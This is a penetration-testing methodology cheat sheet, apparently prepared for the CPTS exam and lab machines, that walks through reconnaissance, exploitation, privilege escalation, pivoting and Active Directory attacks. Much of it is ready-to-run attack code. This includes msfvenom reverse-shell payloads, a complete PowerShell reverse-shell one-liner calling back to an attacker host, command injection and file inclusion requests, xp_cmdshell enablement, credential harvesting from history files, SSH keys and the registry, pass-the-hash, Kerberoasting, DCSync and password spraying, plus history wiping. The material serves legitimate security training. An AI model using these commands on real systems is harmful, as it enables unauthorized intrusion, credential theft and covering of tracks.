# Penetration Testing Workflow - Complete Methodology

## 🎯 Core Philosophy

> **"Our goal is not to get at the systems but to find all the ways to get there."**

This methodology ensures **systematic**, **repeatable**, and **thorough** assessments. Never skip steps, even when you think you've found an entry point.

---

## 📊 The Six-Layer Enumeration Model

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Internet Presence                                   │
│ → Domains, Subdomains, IP Ranges, Cloud Resources           │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: Gateway                                             │
│ → Firewalls, IDS/IPS, WAF, Load Balancers, VPN             │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: Accessible Services                                 │
│ → Ports, Protocols, Versions, Configurations                │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Processes                                           │
│ → Running Services, Data Flow, Dependencies                  │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: Privileges                                          │
│ → Users, Groups, Permissions, ACLs                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 6: OS Setup                                            │
│ → Configurations, Patch Levels, Sensitive Files             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔄 Complete Penetration Testing Workflow

### Phase 0: Preparation & Setup (15-30 minutes)

**Objective**: Establish a organized workspace and baseline environment

#### Checklist
- [ ] Create organized directory structure
- [ ] Set up terminal multiplexer (tmux/terminator)
- [ ] Configure environment variables
- [ ] Start VPN connection
- [ ] Verify connectivity to target network
- [ ] Set up note-taking system
- [ ] Prepare screenshot directory

#### Commands
```bash
# Environment setup
export IP=10.10.10.10
export DOMAIN=target.htb
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Directory structure
mkdir -p {nmap,scans,exploits,loot,notes,screenshots,downloads,www}
cd $(pwd)

# Start tmux session
tmux new -s pentest

# Verify connectivity
ping -c 3 $IP
```

#### Time-Saving Tips
- Use aliases for common commands
- Keep a template directory structure
- Maintain a command history file
- Use environment variables consistently

---

### Phase 1: Network Enumeration (30-60 minutes)

**Objective**: Map the complete attack surface

#### 1.1 Host Discovery

**When to use**: Multiple targets or unknown network range

```bash
# Quick ping sweep
fping -asgq 10.10.10.0/24

# Nmap host discovery
sudo nmap -sn 10.10.10.0/24 -oA scans/host-discovery

# Alternative: masscan for large networks
sudo masscan -p80,443,445,3389 10.10.10.0/24 --rate=1000
```

#### 1.2 Port Scanning

**Strategy**: Fast scan first, then detailed enumeration

```bash
# Step 1: Quick top ports scan (1-2 minutes)
sudo nmap -p- --top-ports=1000 --open -T4 $IP

# Step 2: Full TCP port scan (5-10 minutes)
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA nmap/allports

# Step 3: Extract open ports
ports=$(grep open nmap/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
echo $ports

# Step 4: Detailed service scan
sudo nmap -sC -sV -p $ports $IP -oA nmap/detailed

# Step 5: UDP scan (top 100 ports)
sudo nmap -sU -F --top-ports 100 $IP -oA nmap/udp
```

#### 1.3 Service Enumeration

**For each open port, ask:**
1. What service is running?
2. What version is it?
3. Are there known vulnerabilities?
4. What is the default configuration?
5. Can I interact with it anonymously?

#### Decision Tree: Next Steps Based on Ports

```
Port 21 (FTP)     → Check anonymous login → Download all files
Port 22 (SSH)     → Banner grab → Note version → Check for user enum
Port 25 (SMTP)    → User enumeration → Check for open relay
Port 53 (DNS)     → Zone transfer → Subdomain enumeration
Port 80/443 (HTTP)→ Web enumeration workflow (Phase 2)
Port 139/445 (SMB)→ SMB enumeration → Null session → Share access
Port 1433 (MSSQL) → Try default creds → Check for xp_cmdshell
Port 3306 (MySQL) → Try default creds → Check for UDF exploitation
Port 3389 (RDP)   → Check for NLA → Try credential stuffing
Port 5985 (WinRM) → Check for authentication → Try credentials
```

---

### Phase 2: Service-Specific Enumeration (1-3 hours)

**Objective**: Deep dive into each discovered service

#### 2.1 Web Services (HTTP/HTTPS)

**See**: [`../02-Enumeration/Web-Enumeration/Web-Recon-Workflow.md`](../02-Enumeration/Web-Enumeration/Web-Recon-Workflow.md)

**Quick Workflow**:
```bash
# 1. Technology identification
whatweb $IP
curl -I http://$IP

# 2. Virtual host discovery
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

# 3. Directory enumeration
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# 4. File enumeration
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.js,.bak

# 5. Parameter fuzzing (if applicable)
ffuf -u http://$IP/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

#### 2.2 SMB/CIFS (139/445)

**See**: [`../02-Enumeration/SMB-Enumeration.md`](../02-Enumeration/SMB-Enumeration.md)

```bash
# 1. Basic enumeration
smbclient -N -L //$IP
smbmap -H $IP
enum4linux-ng $IP -A

# 2. Null session check
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --shares

# 3. RID cycling (user enumeration)
crackmapexec smb $IP -u 'guest' -p '' --rid-brute

# 4. Share access
smbclient //$IP/ShareName -N
```

#### 2.3 DNS (53)

```bash
# 1. Zone transfer attempt
dig axfr $DOMAIN @$IP
host -l $DOMAIN $IP

# 2. Subdomain enumeration
dnsenum --enum $DOMAIN -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --dnsserver $IP

# 3. Reverse DNS lookup
nmap -sL 10.10.10.0/24 | grep '(' | cut -d' ' -f5
```

#### 2.4 SNMP (161 UDP)

```bash
# 1. Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP

# 2. SNMP walk
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c private $IP

# 3. Specific OID queries
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

#### 2.5 Database Services

**MySQL (3306)**:
```bash
# Try default credentials
mysql -u root -p -h $IP
mysql -u root -h $IP

# Enumerate users
nmap -p3306 --script mysql-enum $IP
```

**MSSQL (1433)**:
```bash
# Connect with impacket
impacket-mssqlclient sa:password@$IP -windows-auth

# Check for xp_cmdshell
SQL> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> xp_cmdshell 'whoami';
```

---

### Phase 3: Vulnerability Assessment (30-60 minutes)

**Objective**: Identify exploitable weaknesses

#### 3.1 Automated Vulnerability Scanning

```bash
# Nmap vulnerability scripts
sudo nmap -p $ports --script vuln $IP -oA nmap/vuln-scan

# Service-specific vulnerability checks
sudo nmap -p445 --script smb-vuln* $IP
sudo nmap -p80,443 --script http-vuln* $IP
```

#### 3.2 Manual Vulnerability Assessment

**For each service, check**:
- [ ] Default credentials
- [ ] Known CVEs for the version
- [ ] Misconfigurations
- [ ] Anonymous/guest access
- [ ] Information disclosure

#### 3.3 Searchsploit

```bash
# Search for exploits
searchsploit <service> <version>

# Example
searchsploit apache 2.4.49

# Copy exploit to working directory
searchsploit -m <exploit-id>
```

---

### Phase 4: Exploitation & Initial Access (Variable time)

**Objective**: Gain initial foothold on the target

#### 4.1 Exploitation Decision Tree

```
┌─────────────────────────────────────────┐
│ Vulnerability Identified?               │
└─────────────────────────────────────────┘
         │
         ├─ YES → Public Exploit Available?
         │         ├─ YES → Test in safe environment
         │         │        → Modify if needed
         │         │        → Execute exploit
         │         └─ NO  → Manual exploitation
         │                  → Custom payload
         │
         └─ NO  → Credential-based access?
                   ├─ Default credentials
                   ├─ Weak passwords
                   ├─ Password spraying
                   └─ Credential stuffing
```

#### 4.2 Common Exploitation Paths

**Web Application Vulnerabilities**:
```bash
# SQL Injection
sqlmap -u "http://$IP/page.php?id=1" --batch --dump

# Local File Inclusion
curl "http://$IP/page.php?file=../../../../etc/passwd"

# Remote Code Execution
# Test command injection
curl "http://$IP/ping.php?ip=127.0.0.1;whoami"
```

**Public Exploits**:
```bash
# Search and download
searchsploit -m <exploit-id>

# Modify exploit (update IP, port, payload)
vim <exploit-file>

# Execute
python3 exploit.py $IP
```

**Metasploit**:
```bash
msfconsole
search <service> <version>
use <exploit-path>
set RHOSTS $IP
set LHOST $LHOST
set PAYLOAD <payload>
exploit
```

#### 4.3 Payload Generation

**See**: [`../03-Initial-Access/Payload-Generation.md`](../03-Initial-Access/Payload-Generation.md)

```bash
# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=443 -f raw > shell.php

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f raw > shell.jsp
```

#### 4.4 Listener Setup

```bash
# Netcat listener
nc -nvlp 443

# Multi-handler (for meterpreter)
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 443; exploit"
```

---

### Phase 5: Post-Exploitation (30-60 minutes)

**Objective**: Establish persistence, gather information, and identify privilege escalation paths

#### 5.1 Shell Stabilization

**See**: [`../03-Initial-Access/Shell-Stabilization.md`](../03-Initial-Access/Shell-Stabilization.md)

**Linux**:
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

**Windows**:
```powershell
# Upgrade to PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### 5.2 Situational Awareness

**See**: [`../04-Post-Exploitation/Situational-Awareness.md`](../04-Post-Exploitation/Situational-Awareness.md)

**Linux**:
```bash
# System information
uname -a
cat /etc/os-release
hostname

# Current user and privileges
id
sudo -l
cat /etc/passwd
cat /etc/group

# Network information
ip a
ip route
cat /etc/hosts
cat /etc/resolv.conf
netstat -tulpn

# Running processes
ps aux
ps aux | grep root

# Scheduled tasks
cat /etc/crontab
ls -la /etc/cron.*
```

**Windows**:
```powershell
# System information
systeminfo
hostname
whoami /all

# Network information
ipconfig /all
route print
arp -a
netstat -ano

# Running processes
tasklist /v
wmic process list full

# Scheduled tasks
schtasks /query /fo LIST /v

# Installed software
wmic product get name,version
```

#### 5.3 Credential Harvesting

**Linux**:
```bash
# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Configuration files
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.config" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

**Windows**:
```powershell
# Saved credentials
cmdkey /list

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattended installation files
dir /s *unattend.xml
dir /s *sysprep.xml

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### Phase 6: Privilege Escalation (Variable time)

**Objective**: Gain administrative/root access

#### 6.1 Automated Enumeration

**Linux**:
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh -l 2
```

**Windows**:
```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

#### 6.2 Common Privilege Escalation Vectors

**See**: 
- [`../05-Privilege-Escalation/Linux-PrivEsc.md`](../05-Privilege-Escalation/Linux-PrivEsc.md)
- [`../05-Privilege-Escalation/Windows-PrivEsc.md`](../05-Privilege-Escalation/Windows-PrivEsc.md)

**Linux**:
- [ ] SUID binaries
- [ ] Sudo misconfigurations
- [ ] Capabilities
- [ ] Cron jobs
- [ ] Writable /etc/passwd
- [ ] Kernel exploits
- [ ] NFS root squashing

**Windows**:
- [ ] Unquoted service paths
- [ ] Weak service permissions
- [ ] AlwaysInstallElevated
- [ ] Token impersonation (SeImpersonate)
- [ ] Stored credentials
- [ ] Kernel exploits
- [ ] DLL hijacking

---

### Phase 7: Lateral Movement & Pivoting (If applicable)

**Objective**: Move to other systems in the network

#### 7.1 Network Discovery

**From compromised host**:
```bash
# Linux
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### 7.2 Pivoting Techniques

**See**: [`../04-Post-Exploitation/Pivoting-Tunneling.md`](../04-Post-Exploitation/Pivoting-Tunneling.md)

**SSH Dynamic Port Forwarding**:
```bash
ssh -D 9050 user@pivot-host
# Configure proxychains: socks4 127.0.0.1 9050
proxychains nmap -sT -Pn 172.16.5.0/24
```

**Chisel**:
```bash
# Attacker
./chisel server -p 8000 --reverse

# Victim
./chisel client $LHOST:8000 R:socks
```

**Ligolo-ng** (Recommended):
```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Victim
./agent -connect $LHOST:11601 -ignore-cert

# In proxy interface
session
start
```

---

### Phase 8: Active Directory Attacks (If applicable)

**Objective**: Compromise the domain

**See**: [`../06-Active-Directory/Attack-Workflow.md`](../06-Active-Directory/Attack-Workflow.md)

#### 8.1 Initial Enumeration (No Credentials)

```bash
# LLMNR/NBT-NS poisoning
sudo responder -I tun0 -dwv

# User enumeration
kerbrute userenum -d $DOMAIN --dc $IP users.txt

# AS-REP Roasting
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

#### 8.2 Authenticated Enumeration

```bash
# Bloodhound collection
bloodhound-python -u user -p password -ns $IP -d $DOMAIN -c all

# SMB enumeration
crackmapexec smb $IP -u user -p password --shares
crackmapexec smb $IP -u user -p password --users
crackmapexec smb $IP -u user -p password --groups

# LDAP enumeration
ldapsearch -x -H ldap://$IP -D "user@$DOMAIN" -w 'password' -b "DC=domain,DC=local"
```

#### 8.3 Attack Paths

```bash
# Kerberoasting
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $IP -request

# Password spraying
crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success

# Pass-the-Hash
impacket-psexec $DOMAIN/user@$IP -hashes :nthash

# DCSync (if DA)
impacket-secretsdump $DOMAIN/user:password@$IP
```

---

### Phase 9: Reporting & Cleanup

**Objective**: Document findings and clean up artifacts

#### 9.1 Documentation Checklist

- [ ] Screenshot all flags and critical findings
- [ ] Document all commands executed
- [ ] Note all credentials discovered
- [ ] Map the attack path taken
- [ ] Identify all vulnerabilities exploited
- [ ] Record timestamps of activities

#### 9.2 Cleanup

```bash
# Remove uploaded files
rm /tmp/linpeas.sh
rm /tmp/shell.elf
rm C:\Temp\shell.exe

# Clear command history (if required)
history -c
rm ~/.bash_history

# Remove persistence mechanisms
# (Document what was added for reporting)
```

---

## 🎯 Time Management Guidelines

### For CPTS Exam (10 days, 3 machines)

**Per Machine**:
- **Day 1-2**: Full enumeration (Phases 1-3)
- **Day 2-3**: Initial access attempts (Phase 4)
- **Day 3-4**: Post-exploitation and privilege escalation (Phases 5-6)
- **Day 4**: Lateral movement if needed (Phase 7)
- **Buffer**: 1 day for difficult machines

**Daily Schedule**:
- 8-10 hours of active testing
- Regular breaks every 90 minutes
- Document as you go
- Review notes at end of day

---

## 🚨 Common Pitfalls to Avoid

1. **Skipping UDP scans** - SNMP often provides valuable information
2. **Not checking for virtual hosts** - Many web apps use vhost routing
3. **Ignoring low-hanging fruit** - Check default credentials first
4. **Tunnel vision** - If stuck, enumerate more, don't brute force
5. **Poor documentation** - Screenshot everything immediately
6. **Not stabilizing shells** - Stabilize before doing anything else
7. **Forgetting to check sudo -l** - Always check on Linux
8. **Not reading script output** - Automated tools miss context
9. **Skipping manual verification** - Always verify automated findings
10. **Not taking breaks** - Fresh eyes find things tired eyes miss

---

## 📚 Related Resources

- [Enumeration Principles](../02-Enumeration/Enumeration-Principles.md)
- [Web Enumeration Workflow](../02-Enumeration/Web-Enumeration/Web-Recon-Workflow.md)
- [Privilege Escalation Checklist](../05-Privilege-Escalation/PrivEsc-Checklist.md)
- [Active Directory Attack Paths](../06-Active-Directory/Attack-Paths.md)
- [Quick Reference Cheat Sheet](../09-Quick-Reference/Exam-Checklist.md)

---

**Remember**: Methodology over speed. A systematic approach finds more vulnerabilities than rushing.
